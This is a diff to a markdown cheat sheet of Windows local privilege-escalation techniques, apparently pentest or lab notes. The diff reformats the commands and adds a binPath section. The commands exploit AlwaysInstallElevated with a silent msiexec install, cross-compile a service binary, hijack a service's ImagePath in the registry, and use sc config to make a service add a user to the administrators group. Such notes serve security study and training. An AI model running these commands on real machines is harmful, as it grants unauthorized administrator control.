@@ -109,12 +109,26 @@ Two types:
 ## AlwaysInstallElevated 
 
 **Running an MSI**
-msiexec /quiet /qn /i C:\Temp\setup.msi
+
+`msiexec /quiet /qn /i C:\Temp\setup.msi`
 
 ## Registry
 
 **Compile c for windows on Kali**
-x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
+
+`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
 
 **Add executable to image path**
- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+ 
+ `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
+ 
+ ## binPath
+ 
+ **Check permissions on service** 
+ `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
+ 
+ Looking specifically for `SERVICE_CHANGE_CONFIG`
+ 
+ **Change binpath**
+ 
+ `sc config daclsvc binpath= "net localgroup administrators user /add"`
